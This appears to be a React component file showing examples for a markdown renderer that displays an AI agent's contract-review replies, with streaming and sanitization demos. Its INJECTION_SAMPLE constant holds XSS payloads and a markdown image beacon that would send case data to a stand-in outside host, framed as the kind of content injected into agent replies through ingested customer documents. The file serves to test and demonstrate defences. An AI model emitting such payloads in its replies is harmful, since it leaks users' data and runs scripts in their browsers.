'use client';

import * as React from 'react';

import { MarkdownContent } from '@repo/ui/components/markdown-content';

import {
  Bubble,
  BubbleContent,
} from '@/components/design/foundations/components/bubble';
import { Button } from '@/components/design/foundations/components/button';
import { Switch } from '@/components/design/foundations/components/switch';
import { Textarea } from '@/components/design/foundations/components/textarea';
import {
  ToggleGroup,
  ToggleGroupItem,
} from '@/components/design/foundations/components/toggle-group';

/**
 * A reply shaped like what the playbook agent actually writes: a heading, a
 * nested list, a table, inline and fenced code. The thin `**bold**` sample on
 * the Bubble page exercises almost none of the pipeline.
 */
const AGENT_REPLY = `## Liability cap review

I compared the counterparty's redlines against the playbook and found **three** positions worth a look.

1. **Cap multiple.** They moved from 1x to 2x fees.
   - Playbook fallback allows up to 1.5x
   - Anything above that needs Daniel
2. **Carve-outs.** Confidentiality was pulled out of the cap.
3. **Notice period.** Unchanged at 30 days.

| Clause | Playbook | Redline | Status |
|---|---|---|---|
| Liability cap | 1x fees | 2x fees | Escalate |
| Confidentiality | In cap | Carved out | Escalate |
| Notice | 30 days | 30 days | Accept |

Use \`add_rule\` to record the fallback, or apply the whole set at once:

\`\`\`json
{ "clause": "liability_cap", "fallback": "1.5x", "requires_review": true }
\`\`\`

> Escalations block the draft until reviewed.

See the [playbook history](https://example.com/playbooks) for prior rounds.`;

/**
 * Written to pass through as many half-finished states as possible: emphasis,
 * inline code, a link whose href arrives one character at a time, a list, and
 * a fenced block. Those are the moments the two panes disagree.
 */
const STREAMING_SAMPLE = `Comparing the redlines now. The cap moved to **2x fees**, which is above the \`1.5x\` fallback.

Escalating because:

- Confidentiality was **carved out** of the cap
- Notice stayed at 30 days

See the [playbook history](https://example.com/playbooks) before approving.

\`\`\`json
{ "clause": "liability_cap", "requires_review": true }
\`\`\``;

const STREAM_TICK_MS = 45;
const STREAM_CHARS_PER_TICK = 3;

/**
 * Injected markdown is not hypothetical here: agent replies are downstream of
 * customer documents the Context Engine ingested. This is what the pipeline
 * does with the payloads that matter.
 */
const INJECTION_SAMPLE = `An image fetches without a click, so this URL never loads:

![exfiltrated](https://elsewhere.example/pixel?data=case-12345)

Raw HTML is dropped rather than parsed: <script>alert('xss')</script><b>not bold</b>

And a script-protocol link keeps its text but loses the href: [click me](javascript:alert(1))`;

export function MarkdownContentPlaygroundExample() {
  const [source, setSource] = React.useState(AGENT_REPLY);
  const [variant, setVariant] = React.useState<'document' | 'chat'>('chat');
  const [streaming, setStreaming] = React.useState(false);

  return (
    <div className="w-full space-y-4">
      <div className="flex flex-wrap items-center gap-6">
        <div className="flex items-center gap-2">
          <span className="text-muted-foreground text-sm">Variant</span>
          <ToggleGroup
            type="single"
            value={variant}
            onValueChange={(next) => {
              if (next === 'document' || next === 'chat') setVariant(next);
            }}
          >
            <ToggleGroupItem value="document">document</ToggleGroupItem>
            <ToggleGroupItem value="chat">chat</ToggleGroupItem>
          </ToggleGroup>
        </div>

        <label className="flex items-center gap-2">
          <Switch checked={streaming} onCheckedChange={setStreaming} />
          <span className="text-muted-foreground text-sm">streaming</span>
        </label>
      </div>

      <div className="grid w-full gap-4 md:grid-cols-2">
        <Textarea
          aria-label="Markdown source"
          value={source}
          onChange={(event) => setSource(event.target.value)}
          textareaClassName="min-h-96 font-mono text-xs"
        />
        <div className="rounded-[0.5rem] border p-4">
          <MarkdownContent
            variant={variant}
            streaming={streaming}
            content={source}
            className={variant === 'chat' ? 'text-sm/relaxed' : undefined}
          />
        </div>
      </div>
    </div>
  );
}

export function MarkdownContentInChatExample() {
  return (
    <div className="flex w-full max-w-2xl flex-col gap-4">
      <Bubble variant="ghost">
        <BubbleContent>
          <MarkdownContent
            variant="chat"
            content={AGENT_REPLY}
            className="text-sm/relaxed"
          />
        </BubbleContent>
      </Bubble>
    </div>
  );
}

export function MarkdownContentStreamingExample() {
  const [charCount, setCharCount] = React.useState(STREAMING_SAMPLE.length);
  const isStreaming = charCount < STREAMING_SAMPLE.length;

  React.useEffect(() => {
    if (!isStreaming) return;
    const timer = setInterval(() => {
      setCharCount((current) =>
        Math.min(current + STREAM_CHARS_PER_TICK, STREAMING_SAMPLE.length),
      );
    }, STREAM_TICK_MS);
    return () => clearInterval(timer);
  }, [isStreaming]);

  const partial = STREAMING_SAMPLE.slice(0, charCount);

  return (
    <div className="w-full space-y-4">
      <div className="flex items-center gap-3">
        <Button
          variant="outline"
          size="sm"
          onClick={() => setCharCount(0)}
          disabled={isStreaming}
        >
          {isStreaming ? 'Streaming' : 'Replay'}
        </Button>
        <span className="text-muted-foreground text-xs">
          Same text arriving in both panes. Watch the left one flash its
          markers.
        </span>
      </div>

      <div className="grid w-full gap-4 md:grid-cols-2">
        <div className="space-y-2">
          <p className="text-muted-foreground text-xs">
            streaming off: unterminated markers show through, then reflow once
            the closer lands
          </p>
          <div className="min-h-72 rounded-[0.5rem] border p-4">
            <MarkdownContent
              variant="chat"
              content={partial}
              className="text-sm/relaxed"
            />
          </div>
        </div>
        <div className="space-y-2">
          <p className="text-muted-foreground text-xs">
            streaming on: completed before parsing, so it renders formatted the
            whole way
          </p>
          <div className="min-h-72 rounded-[0.5rem] border p-4">
            <MarkdownContent
              variant="chat"
              streaming
              content={partial}
              className="text-sm/relaxed"
            />
          </div>
        </div>
      </div>
    </div>
  );
}

export function MarkdownContentSanitizationExample() {
  return (
    <div className="grid w-full gap-4 md:grid-cols-2">
      <div className="space-y-2">
        <p className="text-muted-foreground text-xs">source</p>
        <pre className="bg-muted overflow-x-auto rounded-[0.5rem] p-4 font-mono text-xs">
          {INJECTION_SAMPLE}
        </pre>
      </div>
      <div className="space-y-2">
        <p className="text-muted-foreground text-xs">rendered</p>
        <div className="rounded-[0.5rem] border p-4">
          <MarkdownContent
            variant="chat"
            content={INJECTION_SAMPLE}
            className="text-sm/relaxed"
          />
        </div>
      </div>
    </div>
  );
}
